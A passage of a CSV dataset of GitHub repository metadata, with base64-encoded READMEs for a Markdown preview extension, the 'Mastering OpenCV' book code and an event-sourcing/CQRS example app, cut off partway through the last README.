name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
c2hkMTAxd3l5LmdpdGh1Yi5pby9tYXJrZG93bi1wcmV2aWV3LWVuaGFuY2Vk
LyMvemgtY24vKQotIFvmraPpq5TkuK3mloddKGh0dHBzOi8vc2hkMTAxd3l5
LmdpdGh1Yi5pby9tYXJrZG93bi1wcmV2aWV3LWVuaGFuY2VkLyMvemgtdHcv
KQoKQ29udGFjdCBtZSBpZiB5b3UgYXJlIHdpbGxpbmcgdG8gaGVscCB0cmFu
c2xhdGUgdGhlIGRvY3VtZW50YXRpb24gOikKCiMjIEtleWJpbmRpbmdzCgo+
IFRoZSA8a2JkPmNtZDwva2JkPiBrZXkgZm9yIF9XaW5kb3dzXyBpcyA8a2Jk
PmN0cmw8L2tiZD4uCgp8IFNob3J0Y3V0cyAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgfCBGdW5jdGlvbmFsaXR5ICAgICAgICAgICAgICB8
CnwgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LSB8IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIHwKfCA8a2JkPmN0cmwt
c2hpZnQtbTwva2JkPiAgICAgICAgICAgICAgICAgICAgIHwgVG9nZ2xlIHBy
ZXZpZXcgICAgICAgICAgICAgfAp8IDxrYmQ+Y3RybC1zaGlmdC1zPC9rYmQ+
ICAgICAgICAgICAgICAgICAgICAgfCBTeW5jIHByZXZpZXcgLyBTeW5jIHNv
dXJjZSB8CnwgPGtiZD5zaGlmdC1lbnRlcjwva2JkPiAgICAgICAgICAgICAg
ICAgICAgICB8IFJ1biBDb2RlIENodW5rICAgICAgICAgICAgIHwKfCA8a2Jk
PmN0cmwtc2hpZnQtZW50ZXI8L2tiZD4gICAgICAgICAgICAgICAgIHwgUnVu
IGFsbCBDb2RlIENodW5rcyAgICAgICAgfAp8IDxrYmQ+Y21kLT08L2tiZD4g
b3IgPGtiZD5jbWQtc2hpZnQtPTwva2JkPiAgfCBQcmV2aWV3IHpvb20gaW4g
ICAgICAgICAgICB8CnwgPGtiZD5jbWQtLTwva2JkPiBvciA8a2JkPmNtZC1z
aGlmdC1cXzwva2JkPiB8IFByZXZpZXcgem9vbSBvdXQgICAgICAgICAgIHwK
fCA8a2JkPmNtZC0wPC9rYmQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAg
IHwgUHJldmlldyByZXNldCB6b29tICAgICAgICAgfAp8IDxrYmQ+ZXNjPC9r
YmQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCBUb2dnbGUgc2lk
ZWJhciBUT0MgICAgICAgICB8CgojIyBDaGFuZ2Vsb2cKCk5ld2VzdCB1cGRh
dGVzIGZvciB0aGUgY3VycmVudCBtaW5vciB2ZXJzaW9uIGNhbiBiZSBmb3Vu
ZCBhdCB0aGUgW25ld2VzdCBub3Rlc10oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0
aHViLmlvL21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQvIy9uZXdlc3QpLgpE
ZXRhaWxlZCBjaGFuZ2VzIGZvciBlYWNoIG9sZCByZWxlYXNlIGNhbiBiZSBm
b3VuZCBhdCBbaGlzdG9yeSBub3Rlc10oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0
aHViLmlvL21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQvIy9oaXN0b3J5KS4K
CiMjIExpY2Vuc2UKCltVbml2ZXJzaXR5IG9mIElsbGlub2lzL05DU0EgT3Bl
biBTb3VyY2UgTGljZW5zZV0oTElDRU5TRS5tZCkK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'code',7074824,"b'Code for the book ""Mastering OpenCV with Practical Computer Vision Projects"" by Packt Publishing 2012.'",b'C++',42,2379,,2379,False,b'https://api.github.com/repos/MasteringOpenCV/code/forks',"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpNYXN0ZXJpbmcg
T3BlbkNWIHdpdGggUHJhY3RpY2FsIENvbXB1dGVyIFZpc2lvbiBQcm9qZWN0
cw0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpGdWxsIHNv
dXJjZS1jb2RlIGZvciB0aGUgYm9vay4NCi0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQoNCiAgICBTb3VyY2UtQ29kZTogICAgaHR0cHM6
Ly9naXRodWIuY29tL01hc3RlcmluZ09wZW5DVi9jb2RlDQogICAgQm9vazog
ICAgICAgICAgIGh0dHA6Ly93d3cucGFja3RwdWIuY29tL2Nvb2wtcHJvamVj
dHMtd2l0aC1vcGVuY3YvYm9vaw0KICAgIENvcHlyaWdodDogICAgICBQYWNr
dCBQdWJsaXNoaW5nIDIwMTIuDQoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NClRvIGJ1aWxkICYgcnVuIHRoZSBwcm9qZWN0cyBm
b3IgdGhlIGJvb2s6DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQ0KLSBJbnN0YWxsIE9wZW5DViAodmVyc2lvbnMgYmV0d2VlbiAyLjQu
MiB0byAyLjQuMTEgYXJlIHN1cHBvcnRlZCwgd2hlcmVhcyBPcGVuQ1YgMy4w
IGlzIG5vdCB5ZXQgc3VwcG9ydGVkKS4gZWc6IGdvIHRvICJodHRwOi8vb3Bl
bmN2Lm9yZy8iLCBjbGljayBvbg0KICBEb3dubG9hZHMsIGRvd25sb2FkIHRo
ZSBsYXRlc3QgT3BlbkNWIDIuNCB2ZXJzaW9uIChpbmNsdWRpbmcgcHJlYnVp
bHQgbGlicmFyeSksIGFuZCBleHRyYWN0DQogIGl0IHRvICJDOlxPcGVuQ1Yi
IGZvciBXaW5kb3dzIG9yICJ+L09wZW5DViIgZm9yIExpbnV4LiBJbiBPcGVu
Q1YgdjIuNC4zLCB0aGUNCiAgcHJlYnVpbHQgT3BlbkNWIGxpYnJhcnkgaXMg
aW4gIkM6XE9wZW5DVlxidWlsZCIgb3IgIn4vT3BlbkNWL2J1aWxkIiwgc3Vj
aCBhcw0KICAiQzpcT3BlbkNWXGJ1aWxkXHg2NFx2YzkiIGZvciBNUyBWaXN1
YWwgU3R1ZGlvIDIwMDggKG9yICJ2czEwIiBmb2xkZXIgZm9yIE1TIA0KICBW
aXN1YWwgU3R1ZGlvIDIwMTAsIG9yIHRoZSAieDg2IiBwYXJlbnQgZm9sZGVy
IGZvciAzMi1iaXQgV2luZG93cykuDQoNCi0gSW5zdGFsbCBhbGwgdGhlIHNv
dXJjZSBjb2RlIG9mIHRoZSBib29rLiBlZzogZXh0cmFjdCB0aGUgY29kZSB0
bw0KICAiQzpcTWFzdGVyaW5nT3BlbkNWIiBmb3IgV2luZG93cyBvciAifi9N
YXN0ZXJpbmdPcGVuQ1YiIGZvciBMaW51eC4NCiAgDQotIEluc3RhbGwgQ01h
a2UgdjIuOCBvciBsYXRlciBmcm9tICJodHRwOi8vd3d3LmNtYWtlLm9yZy8i
Lg0KDQpFYWNoIGNoYXB0ZXIgb2YgdGhlIGJvb2sgaXMgZm9yIGEgc2VwYXJh
dGUgcHJvamVjdC4gVGhlcmVmb3JlIHRoZXJlIGFyZSA5DQpwcm9qZWN0cyBm
b3IgdGhlIDkgY2hhcHRlcnMgKHJlbWVtYmVyIHRoYXQgQ2hhcHRlciA5IGlz
IGFuIG9ubGluZSBjaGFwdGVyIHRoYXQNCmNhbiBiZSBkb3dubG9hZGVkIGZy
b20gImh0dHA6Ly93d3cucGFja3RwdWIuY29tL2Nvb2wtcHJvamVjdHMtd2l0
aC1vcGVuY3YvYm9vayIpLg0KWW91IGNhbiBydW4gZWFjaCBwcm9qZWN0IHNl
cGFyYXRlbHksIHRoZXkgZWFjaCBjb250YWluIGEgUkVBRE1FLm1kIHRleHQg
ZmlsZQ0KZGVzY3JpYmluZyBob3cgdG8gYnVpbGQgdGhhdCBwcm9qZWN0LCB1
c2luZyBDTWFrZSBpbiBtb3N0IGNhc2VzLCBiZWNhdXNlIENNYWtlDQpjYW4g
YmUgdXNlZCB3aXRoIG1hbnkgY29tcGlsZXJzIGFuZCBtYW55IG9wZXJhdGlu
ZyBzeXN0ZW1zLg0KDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tDQpDaGFwdGVyczoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQotIENoMSkgQ2FydG9vbmlmaWVyIGFuZCBTa2luIENoYW5n
ZXIgZm9yIEFuZHJvaWQsIGJ5IFNoZXJ2aW4gRW1hbWkuDQotIENoMikgTWFy
a2VyLWJhc2VkIEF1Z21lbnRlZCBSZWFsaXR5IG9uIGlQaG9uZSBvciBpUGFk
LCBieSBLaHZlZGNoZW5pYSBJZXZnZW4uDQotIENoMykgTWFya2VyLWxlc3Mg
QXVnbWVudGVkIFJlYWxpdHksIGJ5IEtodmVkY2hlbmlhIElldmdlbi4NCi0g
Q2g0KSBFeHBsb3JpbmcgU3RydWN0dXJlIGZyb20gTW90aW9uIHVzaW5nIE9w
ZW5DViwgYnkgUm95IFNoaWxrcm90Lg0KLSBDaDUpIE51bWJlciBQbGF0ZSBS
ZWNvZ25pdGlvbiB1c2luZyBTVk0gYW5kIE5ldXJhbCBOZXR3b3JrcywgYnkg
RGF2aWQgRXNjcml2w6EuDQotIENoNikgTm9uLXJpZ2lkIEZhY2UgVHJhY2tp
bmcsIGJ5IEphc29uIFNhcmFnaWguDQotIENoNykgM0QgSGVhZCBQb3NlIEVz
dGltYXRpb24gdXNpbmcgQUFNIGFuZCBQT1NJVCwgYnkgRGFuaWVsIEzDqWxp
cyBCYWdnaW8uDQotIENoOCkgRmFjZSBSZWNvZ25pdGlvbiB1c2luZyBFaWdl
bmZhY2VzIG9yIEZpc2hlcmZhY2VzLCBieSBTaGVydmluIEVtYW1pLg0KLSBD
aDkpIERldmVsb3BpbmcgRmx1aWQgV2FsbCB1c2luZyB0aGUgTWljcm9zb2Z0
IEtpbmVjdCwgYnkgTmF1cmVlbiBNYWhtb29kLg0KDQoNCi0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpXaGF0IHlvdSBuZWVkIGZvciB0
aGlzIGJvb2s6DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LQ0KWW91IGRvbid0IG5lZWQgdG8gaGF2ZSBzcGVjaWFsIGtub3dsZWRnZSBp
biBjb21wdXRlciB2aXNpb24gdG8gcmVhZCB0aGlzIGJvb2ssDQpidXQgeW91
IHNob3VsZCBoYXZlIGdvb2QgQy9DKysgcHJvZ3JhbW1pbmcgc2tpbGxzIGFu
ZCBiYXNpYyBleHBlcmllbmNlIHdpdGgNCk9wZW5DViBiZWZvcmUgcmVhZGlu
ZyB0aGlzIGJvb2suIFJlYWRlcnMgd2l0aG91dCBleHBlcmllbmNlIGluIE9w
ZW5DViBtYXkgd2lzaCB0bw0KcmVhZCB0aGUgYm9vayBMZWFybmluZyBPcGVu
Q1YgZm9yIGFuIGludHJvZHVjdGlvbiB0byB0aGUgT3BlbkNWIGZlYXR1cmVz
LCBvciByZWFkDQoiT3BlbkNWIDIgQ29va2Jvb2siIGZvciBleGFtcGxlcyBv
biBob3cgdG8gdXNlIE9wZW5DViB3aXRoIHJlY29tbWVuZGVkIEMvQysrDQpw
YXR0ZXJucywgYmVjYXVzZSAiTWFzdGVyaW5nIE9wZW5DViB3aXRoIFByYWN0
aWNhbCBDb21wdXRlciBWaXNpb24gUHJvamVjdHMiIHdpbGwNCnNob3cgeW91
IGhvdyB0byBzb2x2ZSByZWFsIHByb2JsZW1zLCBhc3N1bWluZyB5b3UgYXJl
IGFscmVhZHkgZmFtaWxpYXIgd2l0aCB0aGUNCmJhc2ljcyBvZiBPcGVuQ1Yg
YW5kIEMvQysrIGRldmVsb3BtZW50Lg0KDQpJbiBhZGRpdGlvbiB0byBDL0Mr
KyBhbmQgT3BlbkNWIGV4cGVyaWVuY2UsIHlvdSB3aWxsIGFsc28gbmVlZCBh
IGNvbXB1dGVyLCBhbmQgYW4NCklERSBvZiB5b3VyIGNob2ljZSAoc3VjaCBh
cyBWaXN1YWwgU3R1ZGlvLCBYQ29kZSwgRWNsaXBzZSwgb3IgUXRDcmVhdG9y
LCBydW5uaW5nDQpvbiBXaW5kb3dzLCBNYWMgb3IgTGludXgpLiBTb21lIGNo
YXB0ZXJzIGhhdmUgZnVydGhlciByZXF1aXJlbWVudHMsIHBhcnRpY3VsYXJs
eToNCg0KLSBUbyBkZXZlbG9wIHRoZSBBbmRyb2lkIGFwcCwgeW91IHdpbGwg
bmVlZCBhbiBBbmRyb2lkIGRldmljZSwgQW5kcm9pZA0KICBkZXZlbG9wbWVu
dCB0b29scywgYW5kIGJhc2ljIEFuZHJvaWQgZGV2ZWxvcG1lbnQgZXhwZXJp
ZW5jZS4NCi0gVG8gZGV2ZWxvcCB0aGUgaU9TIGFwcCwgeW91IHdpbGwgbmVl
ZCBhbiBpUGhvbmUsIGlQYWQsIG9yIGlQb2QgVG91Y2ggZGV2aWNlLA0KICBp
T1MgZGV2ZWxvcG1lbnQgdG9vbHMgKGluY2x1ZGluZyBhbiBBcHBsZSBjb21w
dXRlciwgWENvZGUgSURFLCBhbmQgYW4gQXBwbGUNCiAgRGV2ZWxvcGVyIENl
cnRpZmljYXRlKSwgYW5kIGJhc2ljIGlPUyBhbmQgT2JqZWN0aXZlLUMgZGV2
ZWxvcG1lbnQgZXhwZXJpZW5jZS4NCi0gU2V2ZXJhbCBkZXNrdG9wIHByb2pl
Y3RzIHJlcXVpcmUgYSB3ZWJjYW0gY29ubmVjdGVkIHRvIHlvdXIgY29tcHV0
ZXIuIEFueQ0KICBjb21tb24gVVNCIHdlYmNhbSBzaG91bGQgc3VmZmljZSwg
YnV0IGEgd2ViY2FtIG9mIGF0IGxlYXN0IDEgbWVnYXBpeGVsIG1heSBiZQ0K
ICBkZXNpcmFibGUuDQotIENNYWtlIGlzIHVzZWQgaW4gbW9zdCBwcm9qZWN0
cywgaW5jbHVkaW5nIE9wZW5DViBpdHNlbGYsIHRvIGJ1aWxkIGFjcm9zcw0K
ICBvcGVyYXRpbmcgc3lzdGVtcyBhbmQgY29tcGlsZXJzLiBBIGJhc2ljIHVu
ZGVyc3RhbmRpbmcgb2YgYnVpbGQgc3lzdGVtcyBpcw0KICByZXF1aXJlZCwg
YW5kIGtub3dsZWRnZSBvZiBjcm9zcy1wbGF0Zm9ybSBidWlsZGluZyBpcyBy
ZWNvbW1lbmRlZC4NCi0gQW4gdW5kZXJzdGFuZGluZyBvZiBsaW5lYXIgYWxn
ZWJyYSBpcyBleHBlY3RlZCwgc3VjaCBhcyBiYXNpYyB2ZWN0b3IgYW5kIG1h
dHJpeA0KICBvcGVyYXRpb25zIGFuZCBlaWdlbiBkZWNvbXBvc2l0aW9uLg0K
DQpQZXItY2hhcHRlciBSZXF1aXJlbWVudHM6DQotIENoMTogd2ViY2FtIChm
b3IgZGVza3RvcCBhcHApLCBvciBBbmRyb2lkIGRldmVsb3BtZW50IHN5c3Rl
bSAoZm9yIEFuZHJvaWQgYXBwKS4NCi0gQ2gyOiBpT1MgZGV2ZWxvcG1lbnQg
c3lzdGVtICh0byBidWlsZCBhbiBpT1MgYXBwKS4NCi0gQ2gzOiBPcGVuR0wg
YnVpbHQgaW50byBPcGVuQ1YuDQotIENoNDogUENMIChodHRwOi8vcG9pbnRj
bG91ZHMub3JnLykgYW5kIFNTQkEgKGh0dHA6Ly93d3cuaW5mLmV0aHouY2gv
cGVyc29uYWwvY2h6YWNoL29wZW5zb3VyY2UuaHRtbCkuDQotIENoNTogbm90
aGluZy4NCi0gQ2g2OiBub3RoaW5nLCBidXQgcmVxdWlyZXMgdHJhaW5pbmcg
ZGF0YSBmb3IgZXhlY3V0aW9uLg0KLSBDaDc6IG5vdGhpbmcuDQotIENoODog
d2ViY2FtLg0KLSBDaDk6IEtpbmVjdCBkZXB0aCBzZW5zb3IuDQoNCg0KLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClNjcmVlbnNob3Rz
Og0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCi0gQ2gx
KSBDYXJ0b29uaWZpZXIgYW5kIFNraW4gQ2hhbmdlciBmb3IgQW5kcm9pZDoN
CiFbQ2gxKSBDYXJ0b29uaWZpZXIgYW5kIFNraW4gQ2hhbmdlciBmb3IgQW5k
cm9pZF0oaHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NYXN0ZXJpbmdPcGVuQ1Yv
Y29kZS9tYXN0ZXIvQ2hhcHRlcjFfQW5kcm9pZENhcnRvb25pZmllci9zY3Jl
ZW5zaG90LnBuZykNCi0gQ2gyKSBNYXJrZXItYmFzZWQgQXVnbWVudGVkIFJl
YWxpdHkgb24gaVBob25lIG9yIGlQYWQ6DQohW0NoMikgTWFya2VyLWJhc2Vk
IEF1Z21lbnRlZCBSZWFsaXR5IG9uIGlQaG9uZSBvciBpUGFkXShodHRwczov
L3Jhdy5naXRodWIuY29tL01hc3RlcmluZ09wZW5DVi9jb2RlL21hc3Rlci9D
aGFwdGVyMl9pUGhvbmVBUi9zY3JlZW5zaG90LnBuZykNCi0gQ2gzKSBNYXJr
ZXItbGVzcyBBdWdtZW50ZWQgUmVhbGl0eToNCiFbQ2gzKSBNYXJrZXItbGVz
cyBBdWdtZW50ZWQgUmVhbGl0eV0oaHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9N
YXN0ZXJpbmdPcGVuQ1YvY29kZS9tYXN0ZXIvQ2hhcHRlcjNfTWFya2VybGVz
c0FSL3NjcmVlbnNob3QucG5nKQ0KLSBDaDQpIEV4cGxvcmluZyBTdHJ1Y3R1
cmUgZnJvbSBNb3Rpb24gdXNpbmcgT3BlbkNWOg0KIVtDaDQpIEV4cGxvcmlu
ZyBTdHJ1Y3R1cmUgZnJvbSBNb3Rpb24gdXNpbmcgT3BlbkNWXShodHRwczov
L3Jhdy5naXRodWIuY29tL01hc3RlcmluZ09wZW5DVi9jb2RlL21hc3Rlci9D
aGFwdGVyNF9TdHJ1Y3R1cmVGcm9tTW90aW9uL3NjcmVlbnNob3QucG5nKQ0K
LSBDaDUpIE51bWJlciBQbGF0ZSBSZWNvZ25pdGlvbiB1c2luZyBTVk0gYW5k
IE5ldXJhbCBOZXR3b3JrczoNCiFbQ2g1KSBOdW1iZXIgUGxhdGUgUmVjb2du
aXRpb24gdXNpbmcgU1ZNIGFuZCBOZXVyYWwgTmV0d29ya3NdKGh0dHBzOi8v
cmF3LmdpdGh1Yi5jb20vTWFzdGVyaW5nT3BlbkNWL2NvZGUvbWFzdGVyL0No
YXB0ZXI1X051bWJlclBsYXRlUmVjb2duaXRpb24vc2NyZWVuc2hvdC5wbmcp
DQotIENoNikgTm9uLXJpZ2lkIEZhY2UgVHJhY2tpbmc6DQohW0NoNikgTm9u
LXJpZ2lkIEZhY2UgVHJhY2tpbmddKGh0dHBzOi8vcmF3LmdpdGh1Yi5jb20v
TWFzdGVyaW5nT3BlbkNWL2NvZGUvbWFzdGVyL0NoYXB0ZXI2X05vblJpZ2lk
RmFjZVRyYWNraW5nL3NjcmVlbnNob3QucG5nKQ0KLSBDaDcpIDNEIEhlYWQg
UG9zZSBFc3RpbWF0aW9uIHVzaW5nIEFBTSBhbmQgUE9TSVQ6DQohW0NoNykg
M0QgSGVhZCBQb3NlIEVzdGltYXRpb24gdXNpbmcgQUFNIGFuZCBQT1NJVF0o
aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NYXN0ZXJpbmdPcGVuQ1YvY29kZS9t
YXN0ZXIvQ2hhcHRlcjdfSGVhZFBvc2VFc3RpbWF0aW9uL3NjcmVlbnNob3Qu
cG5nKQ0KLSBDaDgpIEZhY2UgUmVjb2duaXRpb24gdXNpbmcgRWlnZW5mYWNl
cyBvciBGaXNoZXJmYWNlczoNCiFbQ2g4KSBGYWNlIFJlY29nbml0aW9uIHVz
aW5nIEVpZ2VuZmFjZXMgb3IgRmlzaGVyZmFjZXNdKGh0dHBzOi8vcmF3Lmdp
dGh1Yi5jb20vTWFzdGVyaW5nT3BlbkNWL2NvZGUvbWFzdGVyL0NoYXB0ZXI4
X0ZhY2VSZWNvZ25pdGlvbi9zY3JlZW5zaG90LnBuZykNCi0gQ2g5KSBEZXZl
bG9waW5nIEZsdWlkIFdhbGwgdXNpbmcgdGhlIE1pY3Jvc29mdCBLaW5lY3Q6
DQohW0NoOSkgRGV2ZWxvcGluZyBGbHVpZCBXYWxsIHVzaW5nIHRoZSBNaWNy
b3NvZnQgS2luZWN0XShodHRwczovL3Jhdy5naXRodWIuY29tL01hc3Rlcmlu
Z09wZW5DVi9jb2RlL21hc3Rlci9DaGFwdGVyOV9GbHVpZEludGVyYWN0aW9u
VXNpbmdLaW5lY3Qvc2NyZWVuc2hvdC5wbmcpDQoNCg0K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'event-sourcing-examples',28677272,"b'Example code for my building and deploying microservices with event sourcing, CQRS and Docker presentation'",b'JavaScript',20,2379,,2379,False,b'https://api.github.com/repos/cer/event-sourcing-examples/forks',"IyBFdmVudC1Tb3VyY2luZytDUVJTIGV4YW1wbGUgYXBwbGljYXRpb24KClRo
aXMgZXhhbXBsZSBhcHBsaWNhdGlvbiBpcyB0aGUgbW9uZXkgdHJhbnNmZXIg
YXBwbGljYXRpb24gZGVzY3JpYmVkIGluIG15IHRhbGsgW0J1aWxkaW5nIGFu
ZCBkZXBsb3lpbmcgbWljcm9zZXJ2aWNlcyB3aXRoIGV2ZW50IHNvdXJjaW5n
LCBDUVJTIGFuZCBEb2NrZXJdKGh0dHA6Ly9wbGFpbm9sZG9iamVjdHMuY29t
L3ByZXNlbnRhdGlvbnMvYnVpbGRpbmctYW5kLWRlcGxveWluZy1taWNyb3Nl
cnZpY2VzLXdpdGgtZXZlbnQtc291cmNpbmctY3Fycy1hbmQtZG9ja2VyLyku
ClRoaXMgdGFsayBkZXNjcmliZXMgYSB3YXkgb2YgYXJjaGl0ZWN0aW5nIGhp
Z2hseSBzY2FsYWJsZSBhbmQgYXZhaWxhYmxlIGFwcGxpY2F0aW9ucyB0aGF0
IGlzIGJhc2VkIG9uIG1pY3Jvc2VydmljZXMsIHBvbHlnbG90IHBlcnNpc3Rl
bmNlLApldmVudCBzb3VyY2luZyAoRVMpIGFuZCBjb21tYW5kIHF1ZXJ5IHJl
c3BvbnNpYmlsaXR5IHNlZ3JlZ2F0aW9uIChDUVJTKS4KQXBwbGljYXRpb25z
IGNvbnNpc3Qgb2YgbG9vc2VseSBjb3VwbGVkIGNvbXBvbmVudHMgdGhhdCBj
b21tdW5pY2F0ZSB1c2luZyBldmVudHMuClRoZXNlIGNvbXBvbmVudHMgY2Fu
IGJlIGRlcGxveWVkIGVpdGhlciBhcyBzZXBhcmF0ZSBzZXJ2aWNlcyBvciBw
YWNrYWdlZCBhcyBhIG1vbm9saXRoaWMgYXBwbGljYXRpb24gZm9yIHNpbXBs
aWZpZWQgZGV2ZWxvcG1lbnQgYW5kIHRlc3RpbmcuCgojIEJ1aWx0IHVzaW5n
IHRoZSBFdmVudHVhdGUgcGxhdGZvcm0KCjxhIGhyZWY9Imh0dHA6Ly9ldmVu
dHVhdGUuaW8iPjxpbWcgc3JjPSJodHRwOi8vZXZlbnR1YXRlLmlvL2kvbG9n
by5naWYiPiA8L2E+CgpSZWFkIHRoZSA8YSBocmVmPSJodHRwOi8vZXZlbnR1
YXRlLmlvIj5vdmVydmlldzwvYT4gb3IgbG9vayBhdCB0aGUgb3RoZXIgPGEg
aHJlZj0iaHR0cDovL2V2ZW50dWF0ZS5pby9leGFtcGxlYXBwcy5odG1sIj5l
eGFtcGxlIGFwcGxpY2F0aW9uczwvYT4uCgojIEJpZyBpZGVhcwoKVGhpcyBl
eGFtcGxlIGlsbHVzdHJhdGVzIHNldmVyYWwgaW1wb3J0YW50IGNvbmNlcHRz
